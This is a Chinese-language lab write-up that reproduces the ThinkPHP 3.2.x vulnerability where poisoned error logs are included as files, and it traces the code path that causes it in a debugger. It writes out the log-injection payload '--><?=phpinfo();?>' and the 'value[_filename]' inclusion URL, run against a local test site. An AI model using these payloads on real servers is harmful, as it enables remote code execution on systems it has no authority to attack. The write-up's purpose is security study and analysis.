# ThinkPHP3.2.X通用漏洞复现

## 环境搭建

利用phpstudy工具协助搭建

phpstudy启动可能遇到端口占用利用cmd命令tskill

    
    
    首先利用命令
    netstat -no 显示目前所有使用的端口以及程序所对应的pid
    找到对应的pid
    利用
    tskill pid来强制关闭进程

先看看从ThinkPHP官网下载的文件

    
    
    https://www.thinkphp.cn/down.html
    3.2.1完整版
    
    
    <?php
    // +----------------------------------------------------------------------    // | ThinkPHP [ WE CAN DO IT JUST THINK ]
    // +----------------------------------------------------------------------    // | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.
    // +----------------------------------------------------------------------    // | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
    // +----------------------------------------------------------------------    // | Author: liu21st <liu21st@gmail.com>
    // +----------------------------------------------------------------------    
    // 应用入口文件
    
    // 检测PHP环境
    if(version_compare(PHP_VERSION,'5.3.0','<'))  die('require PHP > 5.3.0 !');
    
    // 开启调试模式 建议开发阶段开启 部署阶段注释或者设为false
    define('APP_DEBUG',True);
    
    // 定义应用目录
    define('APP_PATH','./Application/');
    
    // 引入ThinkPHP入口文件
    require './ThinkPHP/ThinkPHP.php';
    
    // 亲^_^ 后面不需要任何代码了 就是如此简单

可以看到这里的

    
    
    if(version_compare(PHP_VERSION,'5.3.0','<'))  die('require PHP > 5.3.0 !');

在我初次搭建的时候一直搭建不成功，最后看了代码才发现原因我们的php版本错误了，php版本需要大于5.3.0

![](./img/7644332029669598174.png)

尝试了下php5.3.29发现网站搭建成功

![](./img/1350474306949454427.png)

此时因为我是在虚拟机中搭建我想通过真实主机来访问这个网站，但发现不能访问，尝试Ping发现无论是虚拟机Ping本地还是本地ping虚拟机都不行，但我的kali虚拟机缺可以，查找文献发现方法，设置虚拟机的防火墙设置将下图的两个内容打开

![](./img/5113265685740684774.png)

然后我有发现了一个致命的缺点，我们刚刚设置的网站叫www.ThinkPHP3.2.1.com那么我们在真实主机中要怎么访问呢，那么我们只能将虚拟机的localhost设置为ThinkPHP3.2.1环境，但修改完发现虚拟机直接127.0.0.1访问找不到网页了，最后发现phpstudy的功能只能启动一个网站，我们刚刚启动了新建的那么就需要关闭它再启动localhost

进入网站，点击管理

![](./img/7838465920510629611.png)

真实主机成功访问

# ThinkPHP3.2.3漏洞复现

按照3.2.1的方式搭建

## 漏洞复现

### 日志泄露

> 前提：开启了Debug

THINKPHP3.2 结构：`Application/Runtime/Logs/Home/年份_月份_日期.log`

注意与3.2.1的区别，在于路径

实际渗透中路径可以修改，因此有时候需要自行fuzz测试

![](./img/8738073238874284215.png)

这里因为日志泄露有一个文件包含的任意执行命令漏洞，但含漏洞的版本找不到了

发现网上搜索的漏洞在Thinkphp的官网下的版本都已经修复了

![](./img/1886931149856435622.png)

太痛苦了，找到gitee的提交历史但总共93页也不知道什么时候修好的

    
    
    https://gitee.com/liu21st/thinkphp/commits/master?page=75

### 转折点

之前以为都是Thinkphp里面放着漏洞，后面经过其他师傅的提示才知道是由漏洞可以利用而不是直接就是出现漏洞，比如我准备复现的3.2.x的通用漏洞即文件包含漏洞就是因为一些代码的性质可以利用而不是controller里面直接写了，因此我们需要自行添加进去

至此切回3.2.3的完整版本

在Application/Home/Controller/IndexController.class.php文件中修改为

    
    
    <?php
    
    namespace Home\Controller;
    use Think\Controller;
    
    class IndexController extends Controller
    {
        public function index($value='')
        {
            $this->assign($value);
            $this->display();
        }
    }

但如果仅仅只是这样的话那么会出现如下报错

![](./img/869386224986963502.png)

此时我们需要在

    
    
    Application/Home/View目录下创建一个Index文件夹然后再创建一个index.html文件,这个文件可以直接用原本再View目录下的index.html

![](./img/3190248510437317296.png)

那么基础的前置条件就到这里了

### 3.2.X通用漏洞

漏洞复现前置条件

    
    
    1.改写IndexController.class.php内容
    2.在Application/Home/View目录下创建一个Index文件夹然后再创建一个index.html文件

漏洞展示

#### 通过报错至Log记录中利用

首先我们的报错信息会存放在Log文件中

    
    
    Log记录目录：
    若开启debug模式日志会到：\Application\Runtime\Logs\Home\下
    若未开启debug模式日志会到：\Application\Runtime\Logs\Common\下

我们故意输入带有恶意代码的信息产生报错写入log文件中

![](./img/4520174911197120466.png)

但这里存在一个坑，我们需要注意下面的两种不同的形式产生的效果不同

    
    
    直接用网页的GET方法写入
    [ 2023-02-17T13:57:24+08:00 ] 127.0.0.1 /index.php?m=--%3E%3C?=phpinfo();?%3E
    INFO: [ app_init ] --START--    INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
    INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
    ERR: 无法加载模块:-->
    
    通过burp抓包写入
    [ 2023-02-17T13:59:56+08:00 ] 192.168.174.1 /?m=--><?=phpinfo();?>
    INFO: [ app_init ] --START--    INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
    INFO: [ app_init ] --END-- [ RunTime:0.000439s ]
    ERR: 无法加载模块:-->

二者相比直接用网页的GET写入的会经过url编译，后续会导致文件包含后无法命令执行

接下来就是本次漏洞的困难点如何实现文件包含

    
    
    http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_02_17.log

![](./img/3501323762514493546.png)

#### 通过文件上传利用

如果我们能够上传文件知道其路径可以，那么也可以利用文件包含来利用在目录下创建一个phpinfo文件测试

![](./img/3688590249503464160.png)

### 漏洞原理分析

这里因为之前是虚拟机搭建的环境，现在需要用到phpstorm调试，所以介绍下phpstorm怎么搭建

![](./img/7955864497921318684.png)

    
    
    1.点击加号后选择edit
    2.点击加号后选择PHP Bulit in Web Server
    3.进行配置这里需要注意的是Host选择127.0.0.1和localhost是有区别的，burp如果不配置无法抓取localhost的包，改为127.0.0.1抓包正常
    4.php的版本需要高过5.3

接下来如果修改PHPSTORM调试的话我们需要下载Xdebug插件

具体的话可以参考下面这个师傅的博客

    
    
    https://blog.csdn.net/yinhangbbbbb/article/details/79247331

最后的效果如下

![](./img/6793278325026095222.png)

接下来学习一下thinkphp 4个视图方法

1.display();

    
    
    display('[模板文件]'[,'字符编码'][,'输出类型'])

不带任何参数 | 自动定位当前操作的模板文件  
---|---  
`[模块@][控制器:][操作]` | 常用写法，支持跨模块 模板主题可以和theme方法配合  
完整的模板文件名 | 直接使用完整的模板文件名（包括模板后缀）  
  
2.fetch();

    
    
    fetch方法的用法除了不需要指定输出编码和类型外其它和display基本一致
    
    模板文件的调用方法和 display 方法完全一样，区别就在于 fetch 方法渲染后不是直接输出

3.show();

    
    
    show('渲染内容'[,'字符编码'][,'输出类型'])
    
    渲染内容，例如
    $this->show($content);
    // 也可以指定编码和类型
    $this->show($content, 'utf-8', 'text/xml');

4.assign();

    
    
    如果要在模板中输出变量，必须在在控制器中把变量传递给模板，系统提供了 assign 方法对模板变量赋值，无论何种变量类型都统一使用assign赋值。
    
    $this->assign('name',$value);
    this->assign($1,$2);$2即为传过来的参数（自己在本方法中定义的），$1为展示页面中需要的参数（即：display到的页面中传的参数）。

#### 尝试逆向求解

因为我们知道最后的结果是因为文件包含而出发的漏洞，那么我们可以利用Phpstorm的全局搜索来完成include的查找

    
    
    phpstorm中的快捷键是ctrl+shift+f
    但如果我们处于中文输入的情况下是无法使用的，通过使用win+空格来切换为美式键盘
    在使用上述快捷键即可

我们传入的参数为

    
    
    ?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_02_17.log
    
    因此搜索
    include $_filename查找

![](./img/406110670220199187.png)

原本想直接右键通过Find Usages来逆向查找漏洞利用的，但显示找不到，测试其他的函数有显示就这个load没显示

那只能使用原始的全局搜索了，这里选择严格区分大小写来减少工作量

![](./img/8756893578046619121.png)

发现一个含有templateCacheFile的，因为之前正向调试过一遍知道这个里面包含的路径就是我们的Logs路径,但是同样的问题又出现了fetch找到不到哪里调用

#### 正向Debug

##### 0x0

在IndexController.class.php中下断点，进行调试

##### 0x1

首先看到我们输入漏洞利用语句后先进入assign中，第一个参数为我们的Log路径，第二个参数为空，第一个参数为展示页面中需要的参数（即：display到的页面中传的参数）。

![](./img/594480743564492626.png)

##### 0x2

进入display方法

第一个G测试后发现没什么关联，利用F8跳过

![](./img/1859579866099216630.png)

发现Hook::listen中存在关键词$templateFile,F7跟进分析

##### 0x3

进入后一顿F7，发现通过exec调用了一个Behavior

![](./img/5287005559056507711.png)

##### 0x4

发现实例化了方法

![](./img/7234230220932403754.png)

##### 0x5

在run中发现有一个$tpl调用了fetch方法，这正式我们逆向的时候找到的，那么接下来不出所料应该是调用load然后进行文件包含

![](./img/1541987309146580521.png)

##### 0x6

进入fetch果然一模一样，此时参数为我们的Log文件

![](./img/193045937841427310.png)

##### 0x7

达到最后一步进行Include

![](./img/9066200890444493552.png)

#### 思路分析

我们知道这个可以看作一个链子

    
    
    assign的参数我们可以控制作为链子的头部
    最后的include任意文件包含作为我们的尾部
    通过上述的分析可以明确的是
    assign()中传入我们想要读取的文件路径，因为assign的第一个参数可以作为display到的页面中传的参数
    那么前面的链条就是
    assign()->disply()
    
    因为我们最后以include所在的方法load为结尾出口
    那么拼起来应该是
    assign()->disply()-->xxx-->fetch()-->load()
    
    结合上述Debug的内容那么可以补充为
    assign()->disply()-->Hook::listen-->self::exec-->新建了一个类-->run()-->fetch()-->load()

#### 各个函数出现的意义

##### 0x0

![](./img/3653849398266189387.png)

    
    
    PHP array_merge() 函数
    把两个数组合并为一个数组：
    此时应该变为
    $this->tVar->_filename->目标路径

为什么assign中要将tVar赋值为目标路径

因为在我们调用Hook::listen的时候此时会回调tVar作为$params的参数

![](./img/9069461619575388676.png)

##### 0x1

在Hook::listen中的exec调用时参数为Behavior\ParseTemplateBehavior，这个是什么呢

![](./img/3099131893328422992.png)

这个类似一个路径名称，查找源码包找到其对应位置

![](./img/3150762882540563361.png)

在ThinPHP/Library下，接下来其的行为也可以理解，创建这个library下的行为类，调用run方法接下来就是fetch的调用了

![](./img/3651174685199105914.png)

    
    
    HOOK：钩子就像一个”陷阱”、”监听器”,当A发送一个消息到B时，当消息还未到达目的地B时，被钩子拦截调出一部分代码做处理，这部分代码也叫钩子函数或者回调函数
    理解钩子Hook以及在Thinkphp下利用钩子使用行为扩展
    这里时通过Hook函数调用library拓展包下的类和方法，最终导致了我们的任意文件包含

推测我们不能进行find Usages的原因也可能时因为我们调用的时扩展包，因此检查不到

### 参考链接

    
    
    1.https://blog.weik1.top/2021/09/06/ThinkPHP%203.2.x%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&RCE%E5%88%86%E6%9E%90/
    2.https://blog.csdn.net/qq_43697234/article/details/118931542

